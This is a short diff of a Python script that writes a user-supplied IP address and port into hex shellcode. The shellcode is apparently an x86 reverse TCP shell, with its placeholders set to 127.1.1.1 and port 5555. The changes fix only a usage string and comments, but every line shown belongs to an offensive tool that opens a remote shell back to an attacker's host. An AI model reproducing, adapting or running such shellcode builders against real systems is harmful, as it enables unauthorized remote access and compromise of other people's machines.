@@ -7,10 +7,10 @@ shellcode = "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x68\\
 
 if len(sys.argv) < 3:
 	print("Usage: python " + sys.argv[0] + " <IP> <PORT>")
-	print("Example: python " + sys.argv[0] + "127.1.1.1 5555")
+	print("Example: python " + sys.argv[0] + " 127.1.1.1 5555")
 	exit(1)
 
-#Modify ip addres directly in the shellcode
+#Modify ip address
 ip = sys.argv[1].split('.')
 ip_in_hex = '{:02X}{:02X}{:02X}{:02X}'.format(*map(int, ip))
 shellcode = shellcode.replace('\\x7f\\x01\\x01\\x01', '\\x{0}\\x{1}\\x{2}\\x{3}'.format(
@@ -20,7 +20,7 @@ shellcode = shellcode.replace('\\x7f\\x01\\x01\\x01', '\\x{0}\\x{1}\\x{2}\\x{3}'
 										ip_in_hex[6:8]
 ))
 
-#Modify port number directly in the shellcode
+#Modify port number
 port = hex(socket.htons(int(sys.argv[2])))
 shellcode = shellcode.replace('\\x15\\xb3', '\\x{0}\\x{1}'.format(port[4:6], port[2:4]))
 
